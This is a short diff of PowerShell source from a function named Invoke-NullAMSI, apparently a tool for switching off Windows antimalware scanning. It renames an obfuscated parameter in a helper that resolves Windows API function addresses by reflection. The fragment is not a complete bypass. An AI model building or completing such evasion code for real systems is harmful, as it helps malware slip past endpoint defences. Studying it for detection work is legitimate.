@@ -27,12 +27,12 @@ function Invoke-NullAMSI {
     {
         Param(
             [string] $module,
-            [string] $4msiInittion
+            [string] $function
         )
         $moduleHandle = $GetModule.Invoke($null, @($module))
         $tmpPtr = New-Object IntPtr
         $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $moduleHandle)
-        $GetAddres.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $4msiInittion))
+        $GetAddres.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $function))
     }
 
     # Get a delegate to be able to call Winapi functions with your address
